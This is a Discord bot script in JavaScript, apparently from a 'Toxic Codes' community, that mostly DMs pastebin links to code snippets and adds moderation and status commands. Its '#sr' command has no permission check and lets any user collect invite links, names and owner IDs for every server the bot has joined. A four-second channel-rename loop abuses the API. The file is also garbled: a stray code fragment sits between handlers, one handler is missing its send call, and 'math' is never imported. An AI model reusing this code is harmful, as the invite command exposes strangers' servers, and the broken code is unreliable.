const Discord = require('discord.js');
const moment = require('moment');
const client = new Discord.Client();
const giphy = require('giphy-api')();
const fs = require("fs");
const prefix = "#";
const devs = ['462006869834203159' , '' , '' , ''];
const adminprefix = "#";

client.on('ready', () => {
    console.log('I am ready!');
});

client.on('ready', () => {
   console.log(`----------------`);
      console.log(`star Bot- Script By : Mazen `);
        console.log(`----------------`);
      console.log(`ON ${client.guilds.size} Servers ' Script By : Mazen  Codes ' `);
    console.log(`----------------`);
  console.log(`Logged in as ${client.user.tag}!`);
client.user.setGame(`'#help-js','#help2 ', #تقديم `,"http://twitch.tv/S-F")
client.user.setStatus("dnd")
 
});


client.on('message', msg => {
	var  prefix = "#";
 if (msg.content.startsWith(prefix + 'cal')) {
    let args = msg.content.split(" ").slice(1);
        const question = args.join(' ');
    if (args.length < 1) {
        msg.reply('Specify a equation, please.');
} else {    let answer;
    try {
        answer = math.eval(question);
    } catch (err) {
        msg.reply(`Error: ${err}`);
    }
    
    const embed = new Discord.RichEmbed()
    .addField("**Input**: ",`**${question}**`, true)
    .addField("**Output**: ",`**${answer}**`, true)
    msg.channel.send(embed)
    }
};
});

const developers = ["462006869834203159"]//Toxic Codes
client.on('message', message => {//Toxic Codes
    var argresult = message.content.split(` `).slice(1).join(' ');//Toxic Codes
      if (!developers.includes(message.author.id)) return;
      
  if (message.content.startsWith(adminprefix + 'setg')) {
    client.user.setGame(argresult);
      message.channel.send(`**✅   ${argresult}**`)
  } else 
     if (message.content === (adminprefix + "leave")) {//Toxic Codes
    message.guild.leave();   //Toxic Codes
  } else  
  if (message.content.startsWith(adminprefix + 'setw')) {
  client.user.setActivity(argresult, {type:'WATCHING'});//Toxic Codes
      message.channel.send(`**✅   ${argresult}**`)//Toxic Codes
  } else 
  if (message.content.startsWith(adminprefix + 'setl')) {
  client.user.setActivity(argresult , {type:'LISTENING'});
      message.channel.send(`**✅   ${argresult}**`)//Toxic Codes
  } else 
  if (message.content.startsWith(adminprefix + 'sets')) {
    client.user.setGame(argresult, "https://www.twitch.tv/zero");
      message.channel.send(`**✅**`)//Toxic Codes
  }
  if (message.content.startsWith(adminprefix + 'setname')) {
  client.user.setUsername(argresult).then
      message.channel.send(`Changing The Name To ..**${argresult}** `)
} else
  if (message.content.startsWith(adminprefix + 'setprefix')) {//Toxic Codes
  client.user.setPrefix(argresult).then
      message.channel.send(`Changing Prefix ..**${argresult}** `)//Toxic Codes
} else
if (message.content.startsWith(adminprefix + 'setavatar')) {//Toxic Codes
  client.user.setAvatar(argresult);
    message.channel.send(`Changing The Avatar To :**${argresult}** `);//Toxic Codes
}
});//Toxic Codes


client.on('message', msg => {
    if(msg.author.bot) return;
    
    if(msg.content === '#sr') {
      client.guilds.forEach(g => {
        
        let l = g.id
        g.channels.get(g.channels.first().id).createInvite({
          maxUses: 5,
          maxAge: 86400
        }).then(i => msg.channel.send(`
        **
        Invite Link : <https://discord.gg/${i.code}>
        Server : ${g.name} | Id : ${g.id} 
        Owner ID : ${g.owner.id}
        **
        `))
  
  
      })
    }
    
  })


const hastebin = require('hastebin-gen');
client.on('message', message => {
var PREFIX = '#';
    if(message.content.startsWith(PREFIX + 'dis')) {
            var args = message.content.split(' ').slice(1).join(' ');
}
      var array = [];
      var i = 0;
      if(args){
client.users.filter(u => u.discriminator == args).map(u => {
    if(i > 4){
     return;
    }
    i = i + 1;

   array.push(`${u.tag}`);
});
}
hastebin(`${array.slice(0, 30).join('\n')}`, 'txt').then(l => {
    message.channel.send(`${l}`);
}).catch(console.error);
});
client.on('message' , message => {
var PREFIX = '#';
if(message.content === `${PREFIX}dis         `         ) {
                      let array = [];
                      var i = 0;
client.users.filter(u => u.discriminator == message.author.discriminator).map(u => {
    if(i > 4){
     return;
    }
    i = i + 1;
   array.push(`${u.tag}`);
});
hastebin(`${array.slice(0, 30).join('\n')}`, 'txt').then(l => {
    message.channel.send(`${l}`);
}).catch(console.error);

        }
});


client.on("ready", async  => {
setInterval(function(){
client.channels.find('id', '528247290385661952').setName("W");
client.channels.find('id', '528247290385661952').setName("We");
client.channels.find('id', '528247290385661952').setName("Wel");
client.channels.find('id', '528247290385661952').setName("Welc");
client.channels.find('id', '528247290385661952').setName("Welco");
client.channels.find('id', '528247290385661952').setName("Welcom");
client.channels.find('id', '528247290385661952').setName("Welcome");
client.channels.find('id', '528247290385661952').setName("Welcome T");
client.channels.find('id', '528247290385661952').setName("Welcome To");
client.channels.find('id', '528247290385661952').setName("Welcome To T");
client.channels.find('id', '528247290385661952').setName("Welcome To ox");
client.channels.find('id', '528247290385661952').setName("Welcome To Tox");
client.channels.find('id', '528247290385661952').setName("Welcome To Toxic");
client.channels.find('id', '528247290385661952').setName("Welcome To Toxic C");
client.channels.find('id', '528247290385661952').setName("Welcome To Toxic Co");
client.channels.find('id', '528247290385661952').setName("Welcome To Toxic Cod");
client.channels.find('id', '528247290385661952').setName("Welcome To Toxic Code");
client.channels.find('id', '528247290385661952').setName("Welcome To Toxic Codes");
  }, 4000);
});

client.on('message', rw => {
  if (rw.content.startsWith('#vb')) {
if (!rw.member.hasPermission("MOVE_MEMBERS")) return rw.channel.send("**YOU DONT HAVE PERMISSION** | ❎ ");
let men = rw.mentions.users.first()
let mas = rw.author
if(!men) return rw.channel.send('``');
rw.guild.channels.forEach(c => {
c.overwritePermissions(men.id, {
          CONNECT: false
})
    })
const embed = new Discord.RichEmbed()
.setColor("RANDOM")
.setDescription(`**
 <@${men.id}>
YOU CANT JOIN THE VOICE ROOM
BANNER : <@${rw.author.id}> **`)
.setThumbnail("https://cdn.discordapp.com/attachments/408952032112803850/452090205793681419/fd684707fc14f41663f15ecebf089f06.png")
          
client.users.get(men.id).sendEmbed(embed)
const Embed11 = new Discord.RichEmbed()
.setColor("RANDOM")
.setAuthor(rw.guild.name, rw.guild.iconURL)
.setDescription(`          <@${men.id}>
BANNED
BANNER : <@${rw.author.id}> `)
.setThumbnail("https://cdn.discordapp.com/attachments/408952032112803850/452090205793681419/fd684707fc14f41663f15ecebf089f06.png")
rw.channel.sendEmbed(Embed11).then(rw => {rw.delete(10000)})
    }
})
 
 //فكه
client.on('message', rw => {
  if (rw.content.startsWith('#uvb')) {
if (!rw.member.hasPermission("MOVE_MEMBERS")) return rw.channel.send("**YOU DONT HAVE PERMISSION** | ❎ ");
 let men = rw.mentions.users.first()
 let mas = rw.author
 if(!men) return rw.channel.send('`MANTION THE MEMBER `');
 rw.guild.channels.forEach(c => {
 c.overwritePermissions(men.id, {
         CONNECT: true
 })
    })
const embed = new Discord.RichEmbed()
.setColor("RANDOM")
.setDescription(`**
 <@${men.id}>
 Welcome Back
Back With : <@${rw.author.id}> **`)
.setThumbnail("https://cdn.discordapp.com/attachments/408952032112803850/452093541003296788/start-button-hi.png")
          
client.users.get(men.id).sendEmbed(embed)
const Embed11 = new Discord.RichEmbed()
.setColor("RANDOM")
.setAuthor(rw.guild.name, rw.guild.iconURL)
.setDescription(`          <@${men.id}>
GO FOR VOICE NOW
With : <@${rw.author.id}>
`)
.setThumbnail("https://cdn.discordapp.com/attachments/408952032112803850/452093541003296788/start-button-hi.png")
rw.channel.sendEmbed(Embed11).then(rw => {rw.delete(15000)})
    }
}) 

var stopReacord = true;
var reactionRoles = [];
var definedReactionRole = null;
 
client.on("message", async message => {
    const args = message.content.slice(prefix.length).trim().split(/ +/g);
    const command = args.shift().toLowerCase();
    if(message.author.bot) return;
    if(message.content.indexOf(prefix) !== 0) return;
    if (command == "autoc") {
      if(!message.channel.guild) return message.reply(`**this ~~command~~ __for servers only__**`);
      if(!message.member.hasPermission("ADMINISTRATOR")) return message.channel.send("sorry you can't do this");
      if(!args[0] || args[1]) return message.channel.send(`\`\`\`${prefix}autoC <role-name>\`\`\``);
      var role = message.guild.roles.find( role => { return role.name == args[0] });
      if(!role) return message.channel.send(`no role with name ${definedRoleName} found, make sure you entered correct name`);
      if(definedReactionRole != null  || !stopReacord) return message.channel.send("another reaction role request is running");
      message.channel.send(`now go and add reaction in the message you want for role ${role.name}`);
      definedReactionRole = role;
      stopReacord = false;
    }    
})
client.on('raw', raw => {
  if (!['MESSAGE_REACTION_ADD', 'MESSAGE_REACTION_REMOVE'].includes(raw.t)) return;
  var channel = client.channels.get(raw.d.channel_id);
  if (channel.messages.has(raw.d.message_id)) return;
  channel.fetchMessage(raw.d.message_id).then(message => {
    var reaction = message.reactions.get( (raw.d.emoji.id ? `${raw.d.emoji.name}:${raw.d.emoji.id}` : raw.d.emoji.name) );
    if (raw.t === 'MESSAGE_REACTION_ADD') return client.emit('messageReactionAdd', reaction, client.users.get(raw.d.user_id));
    if (raw.t === 'MESSAGE_REACTION_REMOVE') return client.emit('messageReactionRemove', reaction, client.users.get(raw.d.user_id));
  });
});
client.on('messageReactionAdd', (reaction, user) => {
    if(user.id == client.user.id) return;
    if(!stopReacord) {
      var done = false;
      reactionRoles[reaction.message.id] = { role: definedReactionRole, message_id: reaction.message.id, emoji: reaction.emoji};
      stopReacord =  true;
      definedReactionRole = null;
      reaction.message.react(reaction.emoji.name)
      .catch(err => {done = true; reaction.message.channel.send(`sorry i can't use this emoji but the reaction role done! anyone react will get the role!`)})
      if(done) reaction.remove(user);
    } else {
      var request = reactionRoles[reaction.message.id];
      if(!request) return;
      if(request.emoji.name != reaction.emoji.name) return reaction.remove(user);
      reaction.message.guild.members.get(user.id).addRole(request.role);
    }
})

client.on('messageReactionRemove', (reaction, user) => {
  if(user.id == client.user.id) return;
  if(!stopReacord) return;
  let request = reactionRoles[reaction.message.id];
  if(!request) return;
  reaction.message.guild.members.get(user.id).removeRole(request.role);
});
 
   client.on('message', message => {
    if (message.author.bot) return;
     if (message.content  === prefix + "help-js") {
          const embed = new Discord.RichEmbed()
  

   .setColor('RANDOM')
  .setTimestamp()

  .addField("⦁`All types of codes in Toxic Codes Server 💬`⦁",' ‎ ')
  .addField("❧  **#help-js-source    ➺      ⦁ قسم السورس الأساسي** ⦁",' ‎ ')
   .addField("❧  **#help-js-admin     ➺      ⦁ قسم الأكواد الإدارية** ⦁",' ‎ ')
     .addField("❧  **#help-js-general   ➺      ⦁ قسم الأكواد العامة*** ⦁",' ‎ ')
	   .addField("❧  **#help-js-welcome   ➺      ⦁ قسم أكواد الترحيب** ⦁",' ‎ ')
	 	   .addField("❧  **#help-js-help      ➺      ⦁ قسم أكواد الهلب** ⦁",' ‎ ')
            .addField("❧  **#help-js-bc        ➺      ⦁ قسم أكواد البرودكاست** ⦁",' ‎ ')
                 .addField("❧  **#help-js-games        ➺      ⦁ قسم اكواد الالعاب** ⦁",' ‎ ')
 .setFooter('Toxic Codes')


   message.channel.send({embed});


    }
});
  
  
     client.on('message', message => {
    if (message.author.bot) return;
     if (message.content  === prefix + "help-js-source") {
          const embed = new Discord.RichEmbed()
  

   .setColor('RANDOM')
  .setTimestamp()

  .addField("⦁`All types of codes in Toxic Codes Server 💬`⦁",' ‎ ')
  .addField("**#help-js-source-1  ➺      ⦁ السورس الأساسي**⦁",' ‎ ')
   .addField("**#help-js-source-2  ➺      ⦁ السورس الأساسي مع الستريمنق ومعلومات البوت** ⦁",' ‎ ')
     .addField("**#help-js-source-3  ➺      ⦁ السورس الأساسي مع الستريمنق ومعلومات البوت** ⦁",' ‎ ')
	   .addField("**#help-js-source-4  ➺      ⦁ السورس الأساسي مع الستريمنق ومعلومات البوت** ⦁",' ‎ ')
	 
 .setFooter('Turbo Codes')


   message.channel.send({embed});


    }
});
  
  
  
  client.on('message', message => {
    if (message.author.bot) return;
     if (message.content === prefix + "help-js-source-1") {
		 message.channel.send('**لقد تم ارسال الكود في الخاص :ok_hand: **');
            
	
		 


 message.author.sendMessage(`
 
 ❖ **كود السورس الأساسي**
 https://pastebin.com/xGu8E5jA
`);

    }
});  
  
  .guild.members.filter(m => m.presence.status !== 'all').size}\` : عدد الاعضاء المستلمين`llllllll
  
  
    client.on('message', message => {
    if (message.author.bot) return;
     if (message.content === prefix + "help-js-source-2") {
		 message.channel.send('**لقد تم ارسال الكود في الخاص :ok_hand: **');
            
	
		 


 
 
 ❖ **السورس الأساسي مع الستريمنق ومعلومات البوت**
 https://pastebin.com/rJCgs6he
`);

    }
});  
  
  
  
  
  
      client.on('message', message => {
    if (message.author.bot) return;
     if (message.content === prefix + "help-js-source-3") {
		 message.channel.send('**لقد تم ارسال الكود في الخاص :ok_hand: **');
            
	
		 


 message.author.sendMessage(`
 
 ❖ **السورس الأساسي مع الواتشينق**
 https://pastebin.com/pYgG5HRi
`);

    }
});  
  
  
  
        client.on('message', message => {
    if (message.author.bot) return;
     if (message.content === prefix + "help-js-source-4") {
		 message.channel.send('**لقد تم ارسال الكود في الخاص :ok_hand: **');
            
	
		 


 message.author.sendMessage(`
 
 ❖ **السورس الاساسي مع البنق**
 https://pastebin.com/1pX8Zdrw
`);

    }
});  
  
  
  
  
  
       client.on('message', message => {
    if (message.author.bot) return;
     if (message.content  === prefix + "help-js-admin") {
          const embed = new Discord.RichEmbed()
  

   .setColor('RANDOM')
  .setTimestamp()

 .addField("⦁`All types of codes in Toxic Codes Server 💬`⦁",' ‎ ')
 .addField("**#help-js-admin-1  ➺      ⦁ كود الباند**⦁",' ‎ ')
 .addField("**#help-js-admin-2  ➺      ⦁ كود الكيك** ⦁",' ‎ ')
 .addField("**#help-js-admin-3  ➺      ⦁ كود مسح الشات مع عدد وشبيه بالبروبوت** ⦁",' ‎ ')
 .addField("**#help-js-admin-4  ➺      ⦁ كود فتح وتقفيل الشات** ⦁",' ‎ ')
 .addField("**#help-js-admin-5  ➺      ⦁  كود رابط يرسله خاص ل 100شخص لمدة 24 ساعه** ⦁",' ‎ ')
 .addField("**#help-js-admin-6  ➺      ⦁  كود لانشاء شات كتابي** ⦁",' ‎ ')	  
 .addField("**#help-js-admin-7  ➺      ⦁  كود لانشاء روم صوتي** ⦁",' ‎ ')
 .addField("**#help-js-admin-8  ➺      ⦁  invite : كود دعوه البوت مثال ** ⦁",' ‎ ')	  
 .addField("**#help-js-admin-9  ➺ ⦁  كود الاوتو رول التفعيل داخل السيرفر ** ⦁",' ‎ ')
	  
	  
	  
 .setFooter('Turbo Codes')


   message.channel.send({embed});


    }
});
  
  
  
          client.on('message', message => {
    if (message.author.bot) return;
     if (message.content === prefix + "help-js-admin-1") {
		 message.channel.send('**لقد تم ارسال الكود في الخاص :ok_hand: **');
            
	
		 


 message.author.sendMessage(`
 
 ❖ **كود الباند**
 https://pastebin.com/YZAXKYUB
`);

    }
});  
  
  
  
  
            client.on('message', message => {
    if (message.author.bot) return;
     if (message.content === prefix + "help-js-admin-2") {
		 message.channel.send('**لقد تم ارسال الكود في الخاص :ok_hand: **');
            
	
		 


 message.author.sendMessage(`
 
 ❖ **كود الكيك**
 https://pastebin.com/0cNVLm1a
`);

    }
});  
  
  

              client.on('message', message => {
    if (message.author.bot) return;
     if (message.content === prefix + "help-js-admin-3") {
		 message.channel.send('**لقد تم ارسال الكود في الخاص :ok_hand: **');
            
	
		 


 message.author.sendMessage(`
 
 ❖ **كود مسح الشات ( الكلير ) نفس سبيد بوت**
 https://pastebin.com/QERKkTtk
`);

    }
});  
  
  
  
  
  
                client.on('message', message => {
    if (message.author.bot) return;
     if (message.content === prefix + "help-js-admin-4") {
		 message.channel.send('**لقد تم ارسال الكود في الخاص :ok_hand: **');
            
	
		 


 message.author.sendMessage(`
 
 ❖ **كود فتح وتقفيل الشات**
 https://pastebin.com/gb4me9bS
`);

    }
});  


                  client.on('message', message => {
    if (message.author.bot) return;
     if (message.content === prefix + "help-js-admin-5") {
		 message.channel.send('**لقد تم ارسال الكود في الخاص :ok_hand: **');
            
	
		 


 message.author.sendMessage(`
 
 ❖ ** كود رابط يرسله خاص ل 100شخص لمدة 24 ساعه**
 https://pastebin.com/Xe5kzVUw
`);

    }
});
  
         client.on('message', message => {
    if (message.author.bot) return;
     if (message.content === prefix + "help-js-admin-6") {
		 message.channel.send('**لقد تم ارسال الكود في الخاص :ok_hand: **');
            
	
		 


 message.author.sendMessage(`
 
 ❖ ** كود لانشاء شات كتابي**
 https://pastebin.com/ChtbaGu2
`);

    }
});
  
           client.on('message', message => {
    if (message.author.bot) return;
     if (message.content === prefix + "help-js-admin-7") {
		 message.channel.send('**لقد تم ارسال الكود في الخاص :ok_hand: **');
            
	
		 


 message.author.sendMessage(`
 
 ❖ ** كود لانشاء روم صوتي**
 https://pastebin.com/Y2SWEE6N
`);

    }
});



          client.on('message', message => {
    if (message.author.bot) return;
     if (message.content === prefix + "help-js-admin-8") {
		 message.channel.send('**لقد تم ارسال الكود في الخاص :ok_hand: **');
            
	
		 


 message.author.sendMessage(`
 
 ❖ **invite : كود دعوه البوت مثال **
 https://pastebin.com/hP9VQpFR
`);

    }
});  


          client.on('message', message => {
    if (message.author.bot) return;
     if (message.content === prefix + "help-js-admin-9") {
		 message.channel.send('**لقد تم ارسال الكود في الخاص :ok_hand: **');
            
	
		 


 message.author.sendMessage(`
 
 ❖ **كود الاوتو رول التفعيل داخل السيرفر **
 https://pastebin.com/7tVEa317
`);

    }
});  






         client.on('message', message => {
    if (message.author.bot) return;
     if (message.content  === prefix + "help-js-general") {
          const embed = new Discord.RichEmbed()
  

   .setColor('RANDOM')
  .setTimestamp()

 .addField("⦁`All types of codes in Toxic Codes Server 💬`⦁",' ‎ ')
 .addField("**#help-js-general-1  ➺      ⦁ كود البنق **⦁",' ‎ ')
 .addField("**#help-js-general-2  ➺      ⦁ كود القرعة ** ⦁",' ‎ ')
 .addField("**#help-js-general-3  ➺      ⦁ كود الافتار  ** ⦁",' ‎ ')	  
 .addField("**#help-js-general-4  ➺      ⦁ كود معلومات السيرفر ** ⦁",' ‎ ')
 .addField("**#help-js-general-5  ➺      ⦁ كود المعلومات الشخصية** ⦁",' ‎ ')
 .addField("**#help-js-general-6  ➺      ⦁ كود كت تويت** ⦁",' ‎ ')	  
 .addField("**#help-js-general-7  ➺      ⦁ كود صراحه** ⦁",' ‎ ')	  
	  
	  
 .setFooter('Toxic Codes')

   message.channel.send({embed});


    }
});
  
  
  
  
  
  
                  client.on('message', message => {
    if (message.author.bot) return;
     if (message.content === prefix + "help-js-general-1") {
		 message.channel.send('**لقد تم ارسال الكود في الخاص :ok_hand: **');
            
	
		 


 message.author.sendMessage(`
 
 ❖ **كود البنق**
 https://pastebin.com/iCmTpWJX
`);

    }
});
  
  
  
  
                        client.on('message', message => {
    if (message.author.bot) return;
     if (message.content === prefix + "help-js-general-2") {
		 message.channel.send('**لقد تم ارسال الكود في الخاص :ok_hand: **');
            
	
		 


 message.author.sendMessage(`
 
 ❖ **كود القرعة**
 https://pastebin.com/eZHv8NPC
`);

    }
});
  
  
  
  
  
                    client.on('message', message => {
    if (message.author.bot) return;
     if (message.content === prefix + "help-js-general-3") {
		 message.channel.send('**لقد تم ارسال الكود في الخاص :ok_hand: **');
            
	
		 


 message.author.sendMessage(`
 
 ❖ **كود الافاتار**
 https://pastebin.com/aBzSWJxy
`);

    }
});
  
  
  
  
  
                      client.on('message', message => {
    if (message.author.bot) return;
     if (message.content === prefix + "help-js-general-4") {
		 message.channel.send('**لقد تم ارسال الكود في الخاص :ok_hand: **');
            
	
		 


 message.author.sendMessage(`
 
 ❖ **كود معلومات السيرفر**
 https://pastebin.com/Z082PXt3
`);

    }
});






                    client.on('message', message => {
    if (message.author.bot) return;
     if (message.content === prefix + "help-js-general-5") {
		 message.channel.send('**لقد تم ارسال الكود في الخاص :ok_hand: **');
            
	
		 


 message.author.sendMessage(`
 
 ❖ **كود المعلومات الشخصية**
 https://pastebin.com/ZMhAPtSB
`);

    }
});


                client.on('message', message => {
    if (message.author.bot) return;
     if (message.content === prefix + "help-js-general-6") {
		 message.channel.send('**لقد تم ارسال الكود في الخاص :ok_hand: **');
            
	
		 


 message.author.sendMessage(`
 
 ❖ **كود كت تويت**
 https://pastebin.com/fak2SQsm
`);

    }
});
  
  
  
  
                    client.on('message', message => {
    if (message.author.bot) return;
     if (message.content === prefix + "help-js-general-7") {
		 message.channel.send('**لقد تم ارسال الكود في الخاص :ok_hand: **');
            
	
		 


 message.author.sendMessage(`
 
 ❖ **كود صراحه **
 https://pastebin.com/NC32yt0v
`);

    }
});
  





  
  
  
           client.on('message', message => {
    if (message.author.bot) return;
     if (message.content  === prefix + "help-js-welcome") {
          const embed = new Discord.RichEmbed()
  

   .setColor('RANDOM')
  .setTimestamp()

  .addField("⦁`All types of codes in Toxic Codes Server 💬`⦁",' ‎ ')
  .addField("**#help-js-welcome-1  ➺      ⦁ كود ترحيب مع ذكر رقم العضو **⦁",' ‎ ')
   .addField("**#help-js-welcome-2  ➺      ⦁ كود الترحيب مع صورة ** ⦁",' ‎ ')
     .addField("**#help-js-welcome-3  ➺      ⦁ كود مغادرة العضو ** ⦁",' ‎ ')
	       .addField("**#help-js-welcome-4  ➺      ⦁ كود تم دعوته بواسطة ** ⦁",' ‎ ')

	 
		   
 .setFooter('Toxic Codes')


   message.channel.send({embed});

    }
});
  
  
  
  
                      client.on('message', message => {
    if (message.author.bot) return;
     if (message.content === prefix + "help-js-welcome-1") {
		 message.channel.send('**لقد تم ارسال الكود في الخاص :ok_hand: **');
            
	
		 


 message.author.sendMessage(`
 
 ❖ **كود ترحيب بصورة**
 https://paste.drhack.net/?ded81e2b02cab246#Oej+XdoRpbGnlTET2iH2zKdVCn+WFNCUatLLtOU1urs=
`);

    }
});
  
  
  
  
                        client.on('message', message => {
    if (message.author.bot) return;
     if (message.content === prefix + "help-js-welcome-2") {
		 message.channel.send('**لقد تم ارسال الكود في الخاص :ok_hand: **');
            
	
		 


 message.author.sendMessage(`
 
 ❖ **كود الترحيب في الخاص مع رقم العضو**
 https://paste.drhack.net/?854e74d128b66da8#3menzqbk4bSRPItx7czUQhc1iuwjQRZTyaEVF6ZUktE=
`);

    }
});




                      client.on('message', message => {
    if (message.author.bot) return;
     if (message.content === prefix + "help-js-welcome-3") {
		 message.channel.send('**لقد تم ارسال الكود في الخاص :ok_hand: **');
            
	
		 


 message.author.sendMessage(`
 
 ❖**كود مغادرة العضو**
 https://pastebin.com/8Da43txR
`);

    }
});
  
  
  
                      client.on('message', message => {
    if (message.author.bot) return;
     if (message.content === prefix + "help-js-welcome-4") {
		 message.channel.send('**لقد تم ارسال الكود في الخاص :ok_hand: **');
            
	
		 


 message.author.sendMessage(`
 
 ❖ **كود تم دعوته بواسطة**
 https://pastebin.com/ihCR8nhW
`);

    }
});
  
  
  
             client.on('message', message => {
    if (message.author.bot) return;
     if (message.content  === prefix + "help-js-help") {
          const embed = new Discord.RichEmbed()
  

   .setColor('RANDOM')
  .setTimestamp()

  .addField("⦁`All types of codes in Toxic Codes Server 💬`⦁",' ‎ ')
  .addField("**#help-js-help-1  ➺      ⦁ كود هلب مع امبد يرسل بنفس الشات **⦁",' ‎ ')
   .addField("**#help-js-help-2  ➺      ⦁ كود هلب مزخرف بدون امبد ويرسل عالخاص ** ⦁",' ‎ ')
		   
 .setFooter('Toxic Codes')


   message.channel.send({embed});

    }
});
  
  
  
  
                        client.on('message', message => {
    if (message.author.bot) return;
     if (message.content === prefix + "help-js-help-1") {
		 message.channel.send('**لقد تم ارسال الكود في الخاص :ok_hand: **');
            
	
		 


 message.author.sendMessage(`
 
 ❖ **كود هلب مع امبد يرسل بالخاص**
 https://pastebin.com/ZC0FHb0c
`);

    }
});
  
  
  
                          client.on('message', message => {
    if (message.author.bot) return;
     if (message.content === prefix + "help-js-help-2") {
		 message.channel.send('**لقد تم ارسال الكود في الخاص :ok_hand: **');
            
	
		 


 message.author.sendMessage(`
 
 ❖ **كود هلب بدون امبد ويرسل عالخاص**
 https://pastebin.com/MuCMUQYc
`);

    }
});
  
  


  
               client.on('message', message => {
    if (message.author.bot) return;
     if (message.content  === prefix + "help-js-bc") {
          const embed = new Discord.RichEmbed()
  

   .setColor('RANDOM')
  .setTimestamp()

  .addField("⦁`All types of codes in Toxic CodesServer 💬`⦁",' ‎ ')
  .addField("**#help-js-bc-1  ➺      ⦁ برودكاست + للكل + مطور **⦁",' ‎ ')
  .addField("**#help-js-bc-2  ➺      ⦁ برودكاست + للكل + غير مطور ** ⦁",' ‎ ')
  .addField("**#help-js-bc-3  ➺      ⦁ برودكاست + للأونلاين + مع منشن + غير مطور **⦁",' ‎ ')
  .addField("**#help-js-bc-4  ➺      ⦁ برودكاست + للكل + مع منشن + غير مطور ** ⦁",' ‎ ')	   
		   
 .setFooter('Toxic Codes')


   message.channel.send({embed});

    }
});
  
  
  
  
  
  
  
  
  
  
                              client.on('message', message => {
    if (message.author.bot) return;
     if (message.content === prefix + "help-js-bc-1") {
		 message.channel.send('**لقد تم ارسال الكود في الخاص :ok_hand: **');
            
	
		 


 message.author.sendMessage(`
 
 ❖ **برودكاست + للكل **
 https://pastebin.com/n2SyjdwH
`);

    }
});



                            client.on('message', message => {
    if (message.author.bot) return;
     if (message.content === prefix + "help-js-bc-2") {
		 message.channel.send('**لقد تم ارسال الكود في الخاص :ok_hand: **');
            
	
		 


 message.author.sendMessage(`
 
 ❖ **برودكاست + للكل + غير مطور**
 https://pastebin.com/n2SyjdwH
`);

    }
});




                            client.on('message', message => {
    if (message.author.bot) return;
     if (message.content === prefix + "help-js-bc-3") {
		 message.channel.send('**لقد تم ارسال الكود في الخاص :ok_hand: **');
            
	
		 


 message.author.sendMessage(`
 
 ❖ ** برودكاست + للأونلاين + مع منشن + غير مطور**
 https://pastebin.com/n2SyjdwH
`);

    }
});
  
  
  
  
                              client.on('message', message => {
    if (message.author.bot) return;
     if (message.content === prefix + "help-js-bc-4") {
		 message.channel.send('**لقد تم ارسال الكود في الخاص :ok_hand: **');
            
	
		 


 message.author.sendMessage(`
 
 ❖ **برودكاست + للكل + مع منشن + غير مطور**
 https://pastebin.com/n2SyjdwH
`);

    }
});






  
  

// THIS  MUST  BE  THIS  WAY
client.login(process.env.BOT_TOKEN);
